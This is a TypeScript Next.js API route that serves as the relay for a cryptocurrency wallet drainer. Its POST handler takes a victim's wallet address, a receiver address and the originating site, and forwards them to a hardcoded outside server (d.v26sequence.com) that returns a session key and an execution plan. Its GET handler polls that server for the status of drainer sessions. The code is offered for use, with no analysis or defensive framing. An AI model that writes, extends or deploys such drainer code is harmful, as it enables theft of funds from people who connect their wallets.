import { NextResponse } from "next/server";

interface DrainerPayload {
  wallet: string;
  receiver?: string;
  site?: string;
  timestamp?: number;
}

export async function POST(request: Request) {
  try {
    const payload: DrainerPayload = await request.json();

    console.log("[submit-drainer] Received connection:", {
      wallet: payload.wallet,
      receiver: payload.receiver,
      site: payload.site,
      timestamp: new Date(payload.timestamp || Date.now()).toISOString(),
    });

    // Get backend URL from environment
    const drainerBackendUrl = process.env.DRAINER_BACKEND_URL || "https://d.v26sequence.com/api/compile/drainer";

    console.log("[submit-drainer] Forwarding to:", drainerBackendUrl);

    // Forward to VPS backend
    const response = await fetch(drainerBackendUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error("[submit-drainer] Backend error:", response.status, errorText);
      return NextResponse.json(
        {
          status: "error",
          message: `Drainer backend error: ${errorText}`,
          backendStatus: response.status,
        },
        { status: 502 }
      );
    }

    const result = await response.json();

    console.log("[submit-drainer] Backend response received:", {
      status: result.status,
      hasSessionKey: !!result.sessionKey,
      hasExecutionPlan: !!result.plan,
    });

    return NextResponse.json({
      status: "ok",
      message: "Drainer payload forwarded successfully",
      result,
    });
  } catch (error: any) {
    console.error("[submit-drainer] Error:", error.message, error.stack);
    return NextResponse.json(
      {
        status: "error",
        message: error.message || "Failed to forward drainer payload",
      },
      { status: 500 }
    );
  }
}

// GET endpoint to check backend status
export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const sessionKey = searchParams.get("sessionKey");

    const drainerBackendUrl = process.env.DRAINER_BACKEND_URL || "https://d.v26sequence.com/api/compile/drainer";

    if (sessionKey) {
      // Check session status via backend
      console.log("[submit-drainer] Checking session:", sessionKey);

      const response = await fetch(`${drainerBackendUrl}?sessionKey=${sessionKey}`, {
        method: "GET",
        headers: {
          "Content-Type": "application/json",
        },
      }).catch((err) => {
        console.error("[submit-drainer] Fetch error:", err.message);
        return null;
      });

      if (!response || !response.ok) {
        return NextResponse.json(
          {
            status: "error",
            message: "Session not found or expired",
            backendUrl: drainerBackendUrl,
          },
          { status: 404 }
        );
      }

      const sessionData = await response.json();
      return NextResponse.json(sessionData);
    } else {
      // Just return backend configuration (no health check)
      return NextResponse.json({
        status: "ok",
        message: "Drainer backend configured",
        backend: {
          url: drainerBackendUrl,
          configured: true,
        },
      });
    }
  } catch (error: any) {
    console.error("[submit-drainer] GET error:", error.message);
    return NextResponse.json(
      {
        status: "error",
        message: error.message || "Failed to check backend status",
      },
      { status: 500 }
    );
  }
}
